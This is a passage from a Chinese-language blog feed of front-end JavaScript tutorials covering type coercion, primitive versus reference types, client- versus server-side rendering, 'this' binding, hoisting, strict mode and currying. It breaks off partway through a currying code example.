将值转换为数字</strong></p><table><thead><tr><th>参数</th><th>结果</th></tr></thead><tbody><tr><td>undefined</td><td>NaN</td></tr><tr><td>null</td><td>+0</td></tr><tr><td>布尔值</td><td>true 转为 1，false 转为</td></tr><tr><td>字符串</td><td>能解析则变为数字，否则 NaN</td></tr><tr><td>对象</td><td>先 ToPrimitive(input, Number)，再 ToNumber</td></tr></tbody></table><p><strong>通过 ToString 将值转换为字符串</strong></p><table><thead><tr><th>参数</th><th>结果</th></tr></thead><tbody><tr><td>undefined</td><td>‘undefined’</td></tr><tr><td>null</td><td>‘null’</td></tr><tr><td>布尔值</td><td>true 转为 ‘true’，false 转为 ‘false’</td></tr><tr><td>数字</td><td>直接转，NaN 变为 ‘NaN’</td></tr><tr><td>对象</td><td>先 ToPrimitive(input, String)，再 ToString</td></tr></tbody></table><p>举例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(&#123;&#125; + &#123;&#125;) <span class="comment">//"[object Object][object Object]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//需要转换为原始类型，且没有指定 PrefferedType，所以优先 ToNumber</span></span><br><span class="line"><span class="comment">//&#123;&#125;.valueOf() 结果还是 &#123;&#125;</span></span><br><span class="line"><span class="comment">//继续用ToString，&#123;&#125;.toString() 结果为 "[object Object]"</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span> * &#123;&#125;) <span class="comment">//NaN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//* 只能在 number 上运算，所以 PerfferedType 为 Number，ToPrimitive(&#123;&#125;, Number)</span></span><br><span class="line"><span class="comment">//&#123;&#125;.valueOf() 结果还是 &#123;&#125;，继续 ToString</span></span><br><span class="line"><span class="comment">//&#123;&#125;.toString() 结果为 "[object Object]"</span></span><br><span class="line"><span class="comment">//再将 "[object Object]" 转为 Number，结果为 NaN</span></span><br><span class="line"><span class="comment">//最后 2*NaN 结果还是 NaN</span></span><br></pre></td></tr></table></figure><p><strong><code>==</code> 运算符时隐式转换规则</strong></p><ol><li>x,y 为 <code>null</code>、<code>undefined</code> 两者中一个 // 返回 true</li><li>x、y 为 <code>Number</code> 和 <code>String</code> 类型时，则转换为 <code>Number</code> 类型比较。</li><li>有 <code>Boolean</code> 类型时，<code>Boolean</code> 转化为 <code>Number</code> 类型比较。</li><li>一个 <code>Object</code> 类型，一个 <code>String</code> 或 <code>Number</code> 类型，将 <code>Object</code> 类型进行原始转换后，按上面流程进行原始值比较。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  i: <span class="number">1</span>,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.i++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">1</span> &amp;&amp; a == <span class="number">2</span> &amp;&amp; a == <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="comment">//会打印</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello world!'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基本类型的变量是存放在栈内存（Stack）里的"><a href="#基本类型的变量是存放在栈内存（Stack）里的" class="headerlink" title="基本类型的变量是存放在栈内存（Stack）里的"></a>基本类型的变量是存放在栈内存（Stack）里的</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a, b</span><br><span class="line">a = <span class="string">'zyj'</span></span><br><span class="line">b = a</span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// zyj</span></span><br><span class="line"><span class="built_in">console</span>.log(b) <span class="comment">// zyj</span></span><br><span class="line">a = <span class="string">'呵呵'</span> <span class="comment">// 改变 a 的值，并不影响 b 的值</span></span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// 呵呵</span></span><br><span class="line"><span class="built_in">console</span>.log(b) <span class="comment">// zyj</span></span><br></pre></td></tr></table></figure><p><strong>栈内存中包括了变量的标识符和变量的值。</strong></p><p><img src="/assets/img/js_primitive_type_stack.png" alt="js_primitive_type_stack"></p><h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><p>除了 6 种基本数据类型外，还要剩下的引用类型，即 <code>Object</code> 类型。细分的话，有：<code>Object 类型</code>、<code>Array 类型</code>、<code>Date 类型</code>、<code>RegExp 类型</code>、<code>Function 类型</code> 等。</p><p>引用类型的值是按引用访问的。</p><ul><li>引用类型的值是可变的</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">'zyj'</span> &#125; <span class="comment">// 创建一个对象</span></span><br><span class="line">obj.name = <span class="string">'percy'</span> <span class="comment">// 改变 name 属性的值</span></span><br><span class="line">obj.age = <span class="number">21</span> <span class="comment">// 添加 age 属性</span></span><br><span class="line">obj.giveMeAll = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.name + <span class="string">' : '</span> + <span class="keyword">this</span>.age</span><br><span class="line">&#125; <span class="comment">// 添加 giveMeAll 方法</span></span><br><span class="line">obj.giveMeAll()</span><br></pre></td></tr></table></figure><ul><li>引用类型的比较是引用的比较</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;&#125; <span class="comment">// 新建一个空对象 obj1</span></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;&#125; <span class="comment">// 新建一个空对象 obj2</span></span><br><span class="line"><span class="built_in">console</span>.log(obj1 == obj2) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(obj1 === obj2) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><ul><li>引用类型的值是保存在堆内存（<code>Heap</code>）中的对象（<code>Object</code>）</li></ul><p>与其他编程语言不同，<code>JavaScript</code> 不能直接操作对象的内存空间（堆内存）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123; <span class="attr">name</span>: <span class="string">'percy'</span> &#125;</span><br><span class="line"><span class="keyword">var</span> b</span><br><span class="line">b = a</span><br><span class="line">a.name = <span class="string">'zyj'</span></span><br><span class="line"><span class="built_in">console</span>.log(b.name) <span class="comment">// zyj</span></span><br><span class="line">b.age = <span class="number">22</span></span><br><span class="line"><span class="built_in">console</span>.log(a.age) <span class="comment">// 22</span></span><br><span class="line"><span class="keyword">var</span> c = &#123;</span><br><span class="line">  name: <span class="string">'zyj'</span>,</span><br><span class="line">  age: <span class="number">22</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;JS&lt;/code&gt; 中一个变量可以存放两种类型的值：基本类型和引用类型。&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="基本数据类型" scheme="http://1016990109.github.io/tags/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>客户端渲染 vs 服务端渲染</title>
    <link href="http://1016990109.github.io/2018/09/10/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93-%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%B2%E6%9F%93/"/>
    <id>http://1016990109.github.io/2018/09/10/服务端渲染-客户端渲染/</id>
    <published>2018-09-10T12:03:36.000Z</published>
    <updated>2018-09-12T02:04:12.525Z</updated>
    
    <content type="html"><![CDATA[<p>在前端页面的渲染这块，近几年来感觉经历了从服务端渲染(多页面)=&gt;客户端渲染(<code>SPA</code>)=&gt;同构渲染的演变。</p><a id="more"></a><h2 id="客户端渲染"><a href="#客户端渲染" class="headerlink" title="客户端渲染"></a>客户端渲染</h2><p>在浏览器中通过 <code>JS</code> 直接进行页面的渲染路由跳转等操作，与后端的交互主要为 <code>API</code> 微服务接口的数据调用。得到数据后在前端进行分析处理和界面生成展现。比较代表性的为 <code>React</code>,<code>Vue</code>,<code>Angular</code> 三大前端框架的 <code>SPA(Single Page Application)</code> 应用。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li>天然的浏览器分布式环境</li><li>组件复用度高，还可以通过懒加载等进行性能的进一步优化</li><li>除首屏外性能响应快速</li><li><code>WEB/MOBILE</code> 多端渲染</li><li>前后端分离开发</li></ol><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li>首屏性能差：由于页面渲染、三方包等逻辑都置于一个 <code>JS</code> 文件中，首屏加载会导致一定时间的白屏现象。</li><li>浏览器 <code>SEO</code>：由于现阶段大多搜索引擎采用的爬虫算法是直接抓取页面代码分析，而 <code>SPA</code> 应用只有一个入口文件而没实质内容，<code>SEO</code> 性能差。</li></ol><h2 id="服务端渲染"><a href="#服务端渲染" class="headerlink" title="服务端渲染"></a>服务端渲染</h2><p>后端不仅仅进行数据的获取处理操作，同时也负责页面的生成，最终传到客户端(浏览器)的是生成的包含数据的页面。客户端所需要做的仅仅是 <code>html</code> 页面的展现和之后的 <code>DOM</code> 事件处理。代表为传统的 <code>JSP</code>,<code>PHP</code>,<code>ASP</code> 应用。</p><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ol><li>优秀的 SEO</li><li>首屏加载快</li></ol><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ol><li>负载大：由于渲染任务都交由服务端进行，在高并发的情况下，对于服务端负载压力大，同时丧失了浏览器端作为一个天然分布式系统的优势。</li><li>复用性能差：因为返回的是整个页面，对于每个路由都要重新进行页面刷新，复用性能 上不友好。</li><li>前后端耦合严重，前端开发依赖于后端，开发形式上不友好</li></ol><h2 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h2><p>前后端共用一套 <code>JS</code> 代码，采用不同的构建方式。通过 <code>Node</code> 服务器进行页面的首屏生成。在我的理解上，有点中间件的意思。</p><p><img src="/assets/img/isomorphic.jpg" alt="isomorphic"></p><h3 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h3><p>兼顾客户端渲染和服务端渲染优点。</p><h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><ol><li>对服务器有一定负载。</li><li>需要一定的开发成本。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前来看，客户端渲染和同构已经成为主流。</p><h3 id="首屏渲染"><a href="#首屏渲染" class="headerlink" title="首屏渲染"></a>首屏渲染</h3><p>因为开始渲染时，浏览器需要下载所有的资源才能正常显示页面，故而造成一段时间的空白页面。一般有两种方式解决：</p><ol><li>代码分割。首屏所需要的东西有限，可以将首页需要的东西分割，单独下载，之后的资源再去动态请求。</li><li>预展示。可以在加载资源的过程中弄一些 <code>Loading</code> 界面，告诉用户界面正在加载，达到良好的用户体验。</li></ol><h3 id="SEO"><a href="#SEO" class="headerlink" title="SEO"></a>SEO</h3><p>客户端渲染如果要考虑 <code>SEO</code>，目前有两种方案：</p><ol><li>通过 <code>meta</code> 的元属性进行关键字的 <code>SEO</code></li><li>提供一套静态 <code>HTML</code> 模版供浏览器抓取用以 <code>SEO</code>（比如 <a href="https://prerender.io" target="_blank" rel="noopener">prerender.io</a>）</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在前端页面的渲染这块，近几年来感觉经历了从服务端渲染(多页面)=&amp;gt;客户端渲染(&lt;code&gt;SPA&lt;/code&gt;)=&amp;gt;同构渲染的演变。&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="SSR" scheme="http://1016990109.github.io/tags/SSR/"/>
    
      <category term="服务端渲染" scheme="http://1016990109.github.io/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之JS</title>
    <link href="http://1016990109.github.io/2018/09/08/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BJS/"/>
    <id>http://1016990109.github.io/2018/09/08/前端基础之JS/</id>
    <published>2018-09-08T01:44:06.000Z</published>
    <updated>2018-09-25T07:23:09.148Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JavaScript-中的-this"><a href="#JavaScript-中的-this" class="headerlink" title="JavaScript 中的 this"></a>JavaScript 中的 this</h2><p><code>JS</code> 中的 <code>this</code> 是一个相对复杂的概念，不是简单几句能解释清楚的。粗略地讲，函数的调用方式决定了 <code>this</code> 的值。<code>this</code> 取值符合以下规则：</p><a id="more"></a><ol><li>在调用函数时使用 <code>new</code> 关键字，函数内的 <code>this</code> 是一个全新的对象。</li><li>如果 <code>apply</code>、<code>call</code> 或 <code>bind</code> 方法用于调用、创建一个函数，函数内的 <code>this</code> 就是作为参数传入这些方法的对象。</li><li>当函数作为对象里的方法被调用时，函数内的 <code>this</code> 是调用该函数的对象。比如当 <code>obj.method()</code> 被调用时，函数内的 <code>this</code> 将绑定到 <code>obj</code> 对象。</li><li>如果调用函数不符合上述规则，那么 <code>this</code> 的值指向全局对象（<code>global object</code>）。浏览器环境下 <code>this</code> 的值指向 <code>window</code> 对象，但是在严格模式下(<code>&#39;use strict&#39;</code>)，<code>this</code> 的值为 <code>undefined</code>。</li><li>如果符合上述多个规则，则较高的规则（1 号最高，4 号最低）将决定 <code>this</code> 的值。</li><li>如果该函数是 <code>ES2015</code> 中的箭头函数，将忽略上面的所有规则，<code>this</code> 被设置为它被创建时的上下文。</li></ol><h2 id="IIFE"><a href="#IIFE" class="headerlink" title="IIFE"></a>IIFE</h2><p><code>IIFE</code>(Immediately Invoked Function Expressions)代表立即执行函数。 <code>JavaScript</code> 解析器将 <code>function foo(){ }();</code> 解析成 <code>function foo(){ }</code> 和 <code>();</code>。其中，前者是函数声明；后者（一对括号）是试图调用一个函数，却没有指定名称，因此它会抛出 <code>Uncaught SyntaxError: Unexpected token</code> 的错误。修改方法：</p><p><code>(function foo(){ })()</code> 和 <code>(function foo(){ }())</code>。</p><p>可能会用到 <code>void</code> 操作符：<code>void function foo(){ }();</code>，但是返回值是 <code>undefined</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Don't add JS syntax to this code block to prevent Prettier from formatting it.</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">void</span> (<span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'foo'</span></span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h2 id="null、undefined-和未声明变量"><a href="#null、undefined-和未声明变量" class="headerlink" title="null、undefined 和未声明变量"></a>null、undefined 和未声明变量</h2><p>当你没有提前使用 <code>var</code>、<code>let</code> 或 <code>const</code> 声明变量，就为一个变量赋值时，该变量是未声明变量（<code>undeclared variables</code>）。未声明变量会脱离当前作用域，成为全局作用域下定义的变量。在严格模式下，给未声明的变量赋值，会抛出 <code>ReferenceError</code> 错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  x = <span class="number">1</span> <span class="comment">// 在严格模式下，抛出 ReferenceError 错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo()</span><br><span class="line"><span class="built_in">console</span>.log(x) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><blockquote><p>注意 <code>null == undefined</code>，但是 <code>null !== undefined</code>。</p></blockquote><h2 id="宿主对象（host-objects）和原生对象（native-objects）"><a href="#宿主对象（host-objects）和原生对象（native-objects）" class="headerlink" title="宿主对象（host objects）和原生对象（native objects）"></a>宿主对象（host objects）和原生对象（native objects）</h2><p>原生对象是由 <code>ECMAScript</code> 规范定义的 <code>JavaScript</code> 内置对象，比如 <code>String</code>、<code>Math</code>、<code>RegExp</code>、<code>Object</code>、<code>Function</code> 等等。</p><p>宿主对象是由运行时环境（浏览器或 <code>Node</code>）提供，比如 <code>window</code>、<code>XMLHTTPRequest</code> 等等。</p><h2 id="判断数据类型"><a href="#判断数据类型" class="headerlink" title="判断数据类型"></a>判断数据类型</h2><p>一般有以下一种方式：</p><ul><li><code>typeof</code>，返回对象的基础数据类型(除了 <code>null</code>，因为是 <code>Object</code> 类型；<strong>多加一个 <code>function</code></strong>)(<code>boolean</code>,<code>number</code>,<code>string</code>,<code>object</code>,<code>undefined</code>,<code>function</code>, <code>es6</code> 的 <code>symbol</code>)是何种，小写。</li><li><code>instanceof</code>，一般用来判断引用类型，不是所有浏览器都支持这个语法。</li><li><code>Object.prototype.toString.call(object)</code>，<strong>通用的方法</strong>，返回 <code>[object + 类型]</code>，这里的类型首字母大写，如 <code>Object</code>。</li></ul><blockquote><p>注意 <code>NaN</code> 是 <code>number</code> 类型，<code>null</code> 是 <code>Object</code> 类型。判断数组可以 <code>Array.isArray(arr)</code>，判断 <code>NaN</code> 可以 <code>isNaN(num)</code>。</p></blockquote><h2 id="document-write"><a href="#document-write" class="headerlink" title="document.write"></a>document.write</h2><p><code>document.write()</code> 接收一个字符串作为参数，将该字符串写入文档流中。一旦文档流已经关闭（<code>document.close()</code>），那么 <code>document.write</code> 就会重新利用 <code>document.open()</code> 打开新的文档流并写入，此时原来的文档流会被清空，已渲染好的页面就会被清除，浏览器将重新构建 <code>DOM</code> 并渲染新的页面。</p><blockquote><p>实际生产中，要尽量避免使用 <code>document.write</code>。</p></blockquote><h2 id="功能检测（feature-detection）、功能推断（feature-inference）和-UA-字符串"><a href="#功能检测（feature-detection）、功能推断（feature-inference）和-UA-字符串" class="headerlink" title="功能检测（feature detection）、功能推断（feature inference）和 UA 字符串"></a>功能检测（feature detection）、功能推断（feature inference）和 UA 字符串</h2><h3 id="功能检测"><a href="#功能检测" class="headerlink" title="功能检测"></a>功能检测</h3><p>功能检测包括确定浏览器是否支持某段代码，以及是否运行不同的代码（取决于它是否执行），以便浏览器始终能够正常运行代码功能，而不会在某些浏览器中出现崩溃和错误。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">'geolocation'</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">  <span class="comment">// 可以使用 navigator.geolocation</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 处理 navigator.geolocation 功能缺失</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="功能推断"><a href="#功能推断" class="headerlink" title="功能推断"></a>功能推断</h3><p>功能推断与功能检测一样，会对功能可用性进行检查，但是在判断通过后，还会使用其他功能，因为它假设其他功能也可用，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.getElementsByTagName) &#123;</span><br><span class="line">  element = <span class="built_in">document</span>.getElementById(id)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常不推荐这种方式。功能检测更能保证万无一失。</p><h3 id="UA-字符串"><a href="#UA-字符串" class="headerlink" title="UA 字符串"></a>UA 字符串</h3><p>这是一个浏览器报告的字符串，它允许网络协议对等方（<code>network protocol peers</code>）识别请求用户代理的应用类型、操作系统、应用供应商和应用版本。它可以通过 <code>navigator.userAgent</code> 访问。 然而，这个字符串很难解析并且很可能存在欺骗性。例如，<code>Chrome</code> 会同时作为 <code>Chrome</code> 和 <code>Safari</code> 进行报告。因此，要检测 <code>Safari</code>，除了检查 <code>Safari</code> 字符串，还要检查是否存在 <code>Chrome</code> 字符串。不要使用这种方式。</p><h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>变量提升（<code>hoisting</code>）是用于解释代码中变量声明行为的术语。<strong>使用 <code>var</code>(<code>let</code> 是没用的) 关键字声明或初始化的变量</strong>，会将声明语句“提升”到当前作用域的顶部。 但是，<strong>只有声明</strong>才会触发提升，赋值语句（如果有的话）将保持原样。我们用几个例子来解释一下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 var 声明得到提升</span></span><br><span class="line"><span class="built_in">console</span>.log(foo) <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用 let/const 声明不会提升</span></span><br><span class="line"><span class="built_in">console</span>.log(bar) <span class="comment">// ReferenceError: bar is not defined</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span></span><br><span class="line"><span class="built_in">console</span>.log(bar) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>函数声明会使函数体提升，但函数表达式（以声明变量的形式书写）只有变量声明会被提升。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="built_in">console</span>.log(foo) <span class="comment">// [Function: foo]</span></span><br><span class="line">foo() <span class="comment">// 'FOOOOO'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'FOOOOO'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo) <span class="comment">// [Function: foo]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="built_in">console</span>.log(bar) <span class="comment">// undefined</span></span><br><span class="line">bar() <span class="comment">// Uncaught TypeError: bar is not a function</span></span><br><span class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'BARRRR'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(bar) <span class="comment">// [Function: bar]</span></span><br></pre></td></tr></table></figure><h2 id="attribute-和-property"><a href="#attribute-和-property" class="headerlink" title="attribute 和 property"></a>attribute 和 property</h2><p><code>Attribute</code> 是在 <code>HTML</code> 中定义的，而 <code>property</code> 是在 <code>DOM</code> 上定义的。为了说明区别，假设我们在 <code>HTML</code> 中有一个文本框：<code>&lt;input type=&quot;text&quot; value=&quot;Hello&quot;&gt;</code>。<strong><code>Attribute</code> 只有通过初始 <code>HTML</code> 中设置或者 <code>setAttribute</code> 方法设置才能改变</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> input = <span class="built_in">document</span>.querySelector(<span class="string">'input'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(input.getAttribute(<span class="string">'value'</span>)) <span class="comment">// Hello</span></span><br><span class="line"><span class="built_in">console</span>.log(input.value) <span class="comment">// Hello</span></span><br></pre></td></tr></table></figure><p>但是在文本框中键入 “ World!”后:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(input.getAttribute(<span class="string">'value'</span>)) <span class="comment">// Hello</span></span><br><span class="line"><span class="built_in">console</span>.log(input.value) <span class="comment">// Hello World!</span></span><br></pre></td></tr></table></figure><blockquote><p>注意，除了 <code>value property</code> 外(<code>setAttribute(&#39;value&#39;, [value])</code> 会影响 <code>input.value</code>，但是 <code>input.value = [valie]</code> 并不会更改 <code>attribute</code>)，其他的 <code>attribute</code> 或 <code>property</code> 更改的时候会同时改变另外一个。</p></blockquote><h2 id="load-事件和-DOMContentLoaded-事件"><a href="#load-事件和-DOMContentLoaded-事件" class="headerlink" title="load 事件和 DOMContentLoaded 事件"></a>load 事件和 DOMContentLoaded 事件</h2><p>当初始的 <code>HTML</code> 文档被完全加载和解析完成之后，<code>DOMContentLoaded</code> 事件被触发，而无需等待样式表、图像和子框架的完成加载。</p><p><code>window</code> 的 <code>load</code> 事件仅在 <code>DOM</code> 和所有相关资源全部完成加载后才会触发。</p><h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><p>在文件、脚本、函数的开头加上 <code>&#39;use strict&#39;</code> 来启用严格模式。</p><p>严格模式特点：</p><ol><li>全局变量需要显示声明，直接 <code>x = 1</code> 会报错。</li><li>禁止使用 <code>with</code> 语句，创建 <code>eval</code> 的作用域。</li><li>禁止 <code>this</code> 指向全局对象。</li><li>禁止在函数内部遍历调用栈，<code>fn.caller</code>、<code>fn.arguments</code> 都会报错，注意直接使用 <code>arguments</code> 是不会报错的。</li><li>禁止删除变量，除非 <code>configurable</code> 属性为 <code>true</code>。</li><li>对象不能有重名属性，函数不能有重名参数。</li><li>显示报错，比如删除不可删除变量、对只读属性赋值都会显示报错。</li><li>禁止八进制表示法。</li><li>不允许对 <code>arguments</code> 赋值，不跟踪 <code>arguments</code> 的变化，禁止使用 <code>arguments.callee</code>。</li><li>函数必须声明在顶层，也就是说不能在非函数的代码块中声明函数。</li><li>新增保留字，和 <code>ES6</code> 接轨，如 <code>implements</code>,<code>let</code>,<code>static</code> 等等。</li></ol><h2 id="柯里化-curry"><a href="#柯里化-curry" class="headerlink" title="柯里化(curry)"></a>柯里化(curry)</h2><p>柯里化（<code>currying</code>）是一种模式，其中具有多个参数的函数被分解为多个函数，当被串联调用时，将一次一个地累积所有需要的参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//保留参数合并结果</span></span><br><span class="line">  <span class="keyword">let</span> args = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> curried = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">arguments</span>.length === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> fn.apply(<span class="keyword">this</span>, args)</span><br><span class="line">    &#125; <span class="keyword">else</span> 